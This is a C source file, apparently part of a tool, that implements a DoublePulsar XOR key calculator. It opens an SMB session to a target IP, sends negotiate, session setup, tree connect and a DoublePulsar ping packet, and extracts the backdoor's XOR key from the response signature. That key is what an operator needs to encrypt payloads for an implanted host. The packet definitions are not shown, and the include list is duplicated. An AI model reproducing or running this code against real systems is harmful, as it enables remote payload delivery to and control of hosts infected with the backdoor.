#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include "config.h"

#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

extern int smb_connect(const char *ip, int port);

static int
send_all(int fd, const void *data, size_t length)
{
    const unsigned char *bytes = data;
    size_t sent = 0;

    while (sent < length) {
        ssize_t n = send(fd, bytes + sent, length - sent, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        sent += (size_t)n;
    }
    return 0;
}

static int
recv_all(int fd, void *data, size_t length)
{
    unsigned char *bytes = data;
    size_t received = 0;

    while (received < length) {
        ssize_t n = recv(fd, bytes + received, length - received, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        received += (size_t)n;
    }
    return 0;
}

static int
read_smb_frame(int fd, unsigned char **frame, size_t *frame_length)
{
    unsigned char header[4];
    uint32_t payload_length;
    unsigned char *buffer;

    if (recv_all(fd, header, sizeof(header)) < 0)
        return -1;

    payload_length = ((uint32_t)header[1] << 16) |
                     ((uint32_t)header[2] << 8) |
                     (uint32_t)header[3];

    buffer = malloc(sizeof(header) + (size_t)payload_length);
    if (buffer == NULL)
        return -1;

    for (size_t i = 0; i < sizeof(header); ++i)
        buffer[i] = header[i];

    if (payload_length != 0 &&
        recv_all(fd, buffer + sizeof(header), (size_t)payload_length) < 0) {
        free(buffer);
        return -1;
    }

    *frame = buffer;
    *frame_length = sizeof(header) + (size_t)payload_length;
    return 0;
}

static int
send_request_and_read_response(int fd, const void *packet, size_t packet_length)
{
    unsigned char *response;
    size_t response_length;

    if (send_all(fd, packet, packet_length) < 0)
        return -1;
    if (read_smb_frame(fd, &response, &response_length) < 0)
        return -1;

    free(response);
    return 0;
}

unsigned int
DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    int fd;
    unsigned char *response = NULL;
    size_t response_length = 0;
    unsigned int key;

    fd = smb_connect(ip, port);
    if (fd < 0)
        return 0;

    if (send_request_and_read_response(fd, SMB_NEGOTIATE_PKT,
                                       sizeof(SMB_NEGOTIATE_PKT)) < 0 ||
        send_request_and_read_response(fd, SMB_SESSION_SETUP_PKT,
                                       sizeof(SMB_SESSION_SETUP_PKT)) < 0 ||
        send_request_and_read_response(fd, SMB_TREE_CONNECT_PKT,
                                       sizeof(SMB_TREE_CONNECT_PKT)) < 0 ||
        send_all(fd, DP_PING_PKT, sizeof(DP_PING_PKT)) < 0 ||
        read_smb_frame(fd, &response, &response_length) < 0) {
        close(fd);
        return 0;
    }

    close(fd);

    if ((size_t)SMB_RESP_SIGNATURE_START + 4 > response_length ||
        (size_t)SMB_RESP_SIGNATURE_END > response_length) {
        free(response);
        return 0;
    }

    key = ((unsigned int)response[SMB_RESP_SIGNATURE_START] << 24) |
          ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 16) |
          ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 8) |
          (unsigned int)response[SMB_RESP_SIGNATURE_START + 3];

    free(response);
    return key;
}